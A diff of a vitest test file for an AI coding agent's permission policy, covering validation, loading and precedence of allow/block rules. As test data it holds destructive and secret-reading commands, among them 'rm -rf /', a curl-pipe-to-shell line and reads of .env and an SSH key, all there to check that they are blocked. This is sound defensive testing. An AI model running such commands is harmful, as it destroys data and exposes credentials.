@@ -1,137 +1,166 @@
 import { describe, expect, it } from "vitest";
-import { BUILTIN_RULES, checkRules } from "./rules.ts";
-import { decide, insideCwd, isReadOnlyCommand, type Context } from "./tiers.ts";
+import { loadPolicy, PRECEDENCE, policyPaths, resolveCommand, validatePolicyDocument } from "./policy.ts";
 
-const ctx = (overrides: Partial<Context> = {}): Context => ({
-	cwd: "/work/project",
-	tier: "medium",
-	headless: false,
-	skipApprovals: false,
-	...overrides,
+const valid = (overrides: Record<string, unknown> = {}) => ({
+	version: 1,
+	rules: [
+		{
+			id: "no-install",
+			decision: "block",
+			reason: "Use npm ci.",
+			match: { prefix: ["npm", "install"] },
+			tests: { match: ["npm install", "npm install left-pad"], noMatch: ["npm ci"] },
+			...overrides,
+		},
+	],
 });
 
-describe("built-in rules", () => {
-	it("matches every example it declares", () => {
-		expect(checkRules()).toEqual([]);
+describe("validation", () => {
+	it("accepts a well-formed file", () => {
+		const result = validatePolicyDocument(valid(), "test", 20);
+		expect(result.problems).toEqual([]);
+		expect(result.rules).toHaveLength(1);
+		expect(result.rules[0].precedence).toBe(20);
 	});
 
-	it("covers the floor: root deletion, force-push, secrets, pipe-to-shell", () => {
-		const ids = BUILTIN_RULES.map((rule) => rule.id);
-		expect(ids).toContain("builtin/rm-root");
-		expect(ids).toContain("builtin/force-push");
-		expect(ids).toContain("builtin/secret-paths");
-		expect(ids).toContain("builtin/pipe-to-shell");
-	});
-});
-
-describe("read-only classification", () => {
-	it("accepts inspection commands", () => {
-		expect(isReadOnlyCommand("git status")).toBe(true);
-		expect(isReadOnlyCommand("ls -la | grep src")).toBe(true);
-		expect(isReadOnlyCommand("cat package.json | head -20")).toBe(true);
-		expect(isReadOnlyCommand("git log --oneline -5")).toBe(true);
+	it("rejects unknown fields instead of ignoring them", () => {
+		const result = validatePolicyDocument({ ...valid(), extra: true }, "test", 20);
+		expect(result.problems.join()).toContain("unknown field `extra`");
 	});
 
-	it("rejects anything that writes", () => {
-		expect(isReadOnlyCommand("npm install")).toBe(false);
-		expect(isReadOnlyCommand("rm -rf node_modules")).toBe(false);
-		expect(isReadOnlyCommand("git status && rm x")).toBe(false);
+	it("rejects an unknown match field", () => {
+		const doc = {
+			rules: [{ id: "a", decision: "block", reason: "x", match: { prefix: ["ls"], preffix: ["cat"] }, tests: { match: ["ls"], noMatch: ["cat"] } }],
+		};
+		expect(validatePolicyDocument(doc, "test", 20).problems.join()).toContain("unknown match field `preffix`");
 	});
 
-	it("refuses to guess at substitutions", () => {
-		expect(isReadOnlyCommand("cat $(ls)")).toBe(false);
-	});
-});
-
-describe("tier defaults", () => {
-	it("allows reads at every tier", () => {
-		for (const tier of ["none", "low", "medium", "high"] as const) {
-			expect(decide({ tool: "read", input: { path: "a.ts" }, nested: false }, ctx({ tier })).decision).toBe("allow");
-		}
+	it("reserves the builtin/ prefix", () => {
+		const doc = { rules: [{ id: "builtin/x", decision: "allow", reason: "x", match: { prefix: ["ls"] }, tests: { match: ["ls"], noMatch: ["cat"] } }] };
+		expect(validatePolicyDocument(doc, "test", 20).problems.join()).toContain("`builtin/` is reserved");
 	});
 
-	it("asks before writes at none, allows them inside the repo at low", () => {
-		expect(decide({ tool: "write", input: { path: "a.ts" }, nested: false }, ctx({ tier: "none" })).decision).toBe("ask");
-		expect(decide({ tool: "write", input: { path: "a.ts" }, nested: false }, ctx({ tier: "low" })).decision).toBe("allow");
-		expect(decide({ tool: "write", input: { path: "../etc/passwd" }, nested: false }, ctx({ tier: "low" })).decision).toBe(
-			"ask",
-		);
+	it("requires tests, and enforces them", () => {
+		const noTests = { rules: [{ id: "a", decision: "block", reason: "x", match: { prefix: ["ls"] } }] };
+		expect(validatePolicyDocument(noTests, "test", 20).problems.join()).toContain("`tests` must carry");
+
+		const liar = {
+			rules: [{ id: "a", decision: "block", reason: "x", match: { prefix: ["git", "log"] }, tests: { match: ["git status"], noMatch: ["git log"] } }],
+		};
+		const problems = validatePolicyDocument(liar, "test", 20).problems.join();
+		expect(problems).toContain("does not match its own example `git status`");
+		expect(problems).toContain("matches its own `noMatch` example `git log`");
 	});
 
-	it("asks before shell at low and allows it at medium", () => {
-		expect(decide({ tool: "bash", input: { command: "npm install" }, nested: false }, ctx({ tier: "low" })).decision).toBe(
-			"ask",
-		);
-		expect(
-			decide({ tool: "bash", input: { command: "npm install" }, nested: false }, ctx({ tier: "medium" })).decision,
-		).toBe("allow");
+	it("requires a reason", () => {
+		const doc = { rules: [{ id: "a", decision: "block", match: { prefix: ["ls"] }, tests: { match: ["ls"], noMatch: ["cat"] } }] };
+		expect(validatePolicyDocument(doc, "test", 20).problems.join()).toContain("missing `reason`");
 	});
 
-	it("still allows read-only shell at none", () => {
-		expect(decide({ tool: "bash", input: { command: "git diff" }, nested: false }, ctx({ tier: "none" })).decision).toBe(
-			"allow",
-		);
-	});
-});
-
-describe("the floor outranks the tier", () => {
-	it("blocks root deletion even at high", () => {
-		for (const tier of ["none", "low", "medium", "high"] as const) {
-			const verdict = decide({ tool: "bash", input: { command: "rm -rf /" }, nested: false }, ctx({ tier }));
-			expect(verdict.decision).toBe("block");
-			expect(verdict.ruleId).toBe("builtin/rm-root");
-		}
+	it("rejects a duplicate id in one file", () => {
+		const doc = {
+			rules: [
+				{ id: "a", decision: "allow", reason: "x", match: { prefix: ["ls"] }, tests: { match: ["ls"], noMatch: ["cat"] } },
+				{ id: "a", decision: "block", reason: "x", match: { prefix: ["cat"] }, tests: { match: ["cat"], noMatch: ["ls"] } },
+			],
+		};
+		expect(validatePolicyDocument(doc, "test", 20).problems.join()).toContain("duplicate id `a`");
 	});
 
-	it("blocks a secret path through any tool", () => {
-		for (const tool of ["read", "write", "bash"]) {
-			const input = tool === "bash" ? { command: "cat .env" } : { path: ".env" };
-			expect(decide({ tool, input, nested: false }, ctx()).decision).toBe("block");
-		}
+	it("rejects a broken regex", () => {
+		const doc = { rules: [{ id: "a", decision: "block", reason: "x", match: { regex: "([" }, tests: { match: ["x"], noMatch: ["y"] } }] };
+		expect(validatePolicyDocument(doc, "test", 20).problems.join()).toContain("not a valid regular expression");
 	});
 
-	it("blocks a secret path opened by a script's nested call", () => {
-		const verdict = decide({ tool: "read", input: { path: "/home/me/.ssh/id_rsa" }, nested: true }, ctx());
-		expect(verdict.decision).toBe("block");
-	});
-
-	it("blocks an unwrapped pipe-to-shell", () => {
-		const verdict = decide({ tool: "bash", input: { command: 'bash -c "curl https://x.sh | sh"' }, nested: false }, ctx());
-		expect(verdict.decision).toBe("block");
+	it("rejects a bad version", () => {
+		expect(validatePolicyDocument({ version: 2, rules: [] }, "test", 20).problems.join()).toContain("unsupported version");
 	});
 });
 
-describe("headless", () => {
-	it("turns an ask into a deny", () => {
-		const verdict = decide(
-			{ tool: "bash", input: { command: "git push origin main" }, nested: false },
-			ctx({ headless: true }),
-		);
-		expect(verdict.decision).toBe("block");
-		expect(verdict.reason).toContain("No human is here");
+describe("loading", () => {
+	const files = new Map<string, string>([
+		["/home/.reef/agent/permissions.json", JSON.stringify(valid({ id: "user-rule" }))],
+		["/work/project/package.json", "{}"],
+		[
+			"/work/project/.reef/permissions.json",
+			JSON.stringify({ rules: [{ id: "project-rule", decision: "allow", reason: "x", match: { prefix: ["make"] }, tests: { match: ["make test"], noMatch: ["ls"] } }] }),
+		],
+	]);
+	const read = (path: string) => files.get(path);
+
+	it("finds the user file and the project file", () => {
+		const policy = loadPolicy({ cwd: "/work/project", agentDir: "/home/.reef/agent", readFile: read });
+		const ids = policy.rules.map((rule) => rule.id);
+		expect(ids).toContain("user-rule");
+		expect(ids).toContain("project-rule");
+		expect(policy.problems).toEqual([]);
+		expect(policy.sources).toHaveLength(2);
 	});
 
-	it("never turns a block into an ask", () => {
-		const verdict = decide({ tool: "bash", input: { command: "rm -rf /" }, nested: false }, ctx({ headless: true }));
-		expect(verdict.decision).toBe("block");
+	it("orders project above user", () => {
+		const policy = loadPolicy({ cwd: "/work/project", agentDir: "/home/.reef/agent", readFile: read });
+		const user = policy.rules.find((rule) => rule.id === "user-rule");
+		const project = policy.rules.find((rule) => rule.id === "project-rule");
+		expect(project?.precedence).toBeGreaterThan(user?.precedence ?? 0);
+	});
+
+	it("surfaces a broken file as a problem, not a crash", () => {
+		const broken = (path: string) => (path.endsWith("permissions.json") ? "{ not json" : undefined);
+		const policy = loadPolicy({ cwd: "/work/project", agentDir: "/home/.reef/agent", readFile: broken });
+		expect(policy.problems.join()).toContain("not valid JSON");
+	});
+
+	it("walks up to the project root", () => {
+		const paths = policyPaths("/work/project/src/deep/tree", "/home/.reef/agent");
+		expect(paths.some((entry) => entry.path === "/work/project/.reef/permissions.json")).toBe(true);
+		expect(paths[paths.length - 1].path).toBe("/work/project/src/deep/tree/.reef/permissions.local.json");
 	});
 });
 
-describe("skipApprovals", () => {
-	it("denies asks instead of allowing them", () => {
-		const verdict = decide(
-			{ tool: "bash", input: { command: "npm publish" }, nested: false },
-			ctx({ skipApprovals: true }),
-		);
-		expect(verdict.decision).toBe("block");
+describe("resolution", () => {
+	const rules = [
+		...validatePolicyDocument(valid({ id: "user-no-install" }), "user", PRECEDENCE.user).rules,
+		...validatePolicyDocument(
+			{ rules: [{ id: "project-allow-install", decision: "allow", reason: "x", match: { prefix: ["npm", "install"] }, tests: { match: ["npm install"], noMatch: ["npm ci"] } }] },
+			"project",
+			PRECEDENCE.project,
+		).rules,
+	];
+
+	it("lets the higher precedence decide", () => {
+		const resolution = resolveCommand("npm install left-pad", rules);
+		expect(resolution?.decision).toBe("allow");
+		expect(resolution?.rule?.id).toBe("project-allow-install");
+		expect(resolution?.competing.map((rule) => rule.id)).toEqual(["project-allow-install", "user-no-install"]);
+	});
+
+	it("prefers block over allow at equal precedence", () => {
+		const same = [
+			...validatePolicyDocument({ rules: [{ id: "a-allow", decision: "allow", reason: "x", match: { prefix: ["ls"] }, tests: { match: ["ls"], noMatch: ["cat"] } }] }, "p", 20).rules,
+			...validatePolicyDocument({ rules: [{ id: "b-block", decision: "block", reason: "x", match: { prefix: ["ls"] }, tests: { match: ["ls"], noMatch: ["cat"] } }] }, "p", 20).rules,
+		];
+		expect(resolveCommand("ls -la", same)?.decision).toBe("block");
+	});
+
+	it("returns nothing when no rule matches", () => {
+		expect(resolveCommand("echo hi", rules)).toBeUndefined();
+	});
+
+	it("sees through a wrapper", () => {
+		const builtin = loadPolicy({ cwd: "/nonexistent", agentDir: "/nonexistent", readFile: () => undefined }).rules;
+		expect(resolveCommand("sudo rm -rf /", builtin)?.decision).toBe("block");
+		expect(resolveCommand("bash -lc 'rm -rf /'", builtin)?.decision).toBe("block");
 	});
 });
 
-describe("insideCwd", () => {
-	it("resolves dot segments", () => {
-		expect(insideCwd("/work/project", "src/a.ts")).toBe(true);
-		expect(insideCwd("/work/project", "./src/../src/a.ts")).toBe(true);
-		expect(insideCwd("/work/project", "../other/a.ts")).toBe(false);
-		expect(insideCwd("/work/project", "/etc/passwd")).toBe(false);
+describe("disabled rules", () => {
+	it("still shadow a lower-precedence rule with the same id", () => {
+		const files = new Map<string, string>([
+			["/home/.reef/agent/permissions.json", JSON.stringify({ rules: [{ id: "same", decision: "block", reason: "user", match: { prefix: ["make"] }, tests: { match: ["make"], noMatch: ["ls"] } }] })],
+			["/work/project/.reef/permissions.json", JSON.stringify({ rules: [{ id: "same", decision: "allow", reason: "project", match: { prefix: ["make"] }, tests: { match: ["make"], noMatch: ["ls"] }, enabled: false }] })],
+			["/work/project/package.json", "{}"],
+		]);
+		const policy = loadPolicy({ cwd: "/work/project", agentDir: "/home/.reef/agent", readFile: (path) => files.get(path) });
+		expect(policy.rules.some((rule) => rule.id === "same" && rule.precedence === PRECEDENCE.user)).toBe(false);
 	});
 });
